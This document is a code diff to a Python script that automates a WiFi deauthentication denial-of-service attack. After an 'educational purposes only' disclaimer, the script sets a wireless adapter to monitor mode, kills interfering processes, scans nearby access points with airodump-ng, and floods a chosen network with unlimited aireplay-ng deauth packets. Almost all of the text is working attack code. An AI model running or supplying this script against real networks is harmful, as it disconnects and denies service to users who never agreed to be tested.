@@ -1,4 +1,3 @@
-  
 #!/usr/bin/env python3
 # Disclaimer: This script is for educational purposes only.  Do not use against any network that you don't own or have authorization to test.
 
@@ -113,23 +112,23 @@ hacknic = check_wifi_result[int(wifi_interface_choice)]
 # Tell the user we're going to kill the conflicting processes.
 print("WiFi adapter connected!\nNow let's kill conflicting processes:")
 
-# subprocess.run(<list of command line arguments goes here>)
-# The script is the parent process and creates a child process which runs the system command, 
-# and will only continue once the child process has completed.
-# We run the iwconfig command to look for wireless interfaces.
-# Killing all conflicting processes using airmon-ng
-kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
-
 # Put wireless in Monitor mode
 print("Putting Wifi adapter into monitored mode:")
-put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
+# This is one way to put it into monitoring mode. You can also use iwconfig, or airmon-ng.
+subprocess.run(["ip", "link", "set", hacknic, "down"])
+# Killing additional processes makes sure that nothing interferes with putting controller into monitor mode.
+subprocess.run(["airmon-ng", "check", "kill"])
+# Put the WiFi nic in monitor mode.
+subprocess.run(["iw", hacknic, "set", "monitor", "none"])
+# Bring the WiFi controller back online.
+subprocess.run(["ip", "link", "set", hacknic, "up"])
 
 # subprocess.Popen(<list of command line arguments goes here>)
 # The Popen method opens a pipe from a command. 
 # The output is an open file that can be accessed by other programs.
 # We run the iwconfig command to look for wireless interfaces.
 # Discover access points
-discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 # Loop that shows the wireless access points. We use a try except block and we will quit the loop by pressing ctrl-c.
 try:
@@ -189,13 +188,13 @@ hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
 
 # Change to the channel we want to perform the DOS attack on. 
 # Monitoring takes place on a different channel and we need to set it to that channel. 
-subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
+subprocess.run(["airmon-ng", "start", hacknic, hackchannel])
 
 # Deauthenticate clients using a subprocess. 
 # The script is the parent process and creates a child process which runs the system command, 
 # and will only continue once the child process has completed.
-subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
-
+try:
+    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, hacknic])
+except KeyboardInterrupt:
+    print("Done!")
 # User will need to use control-c to break the script.
-
-
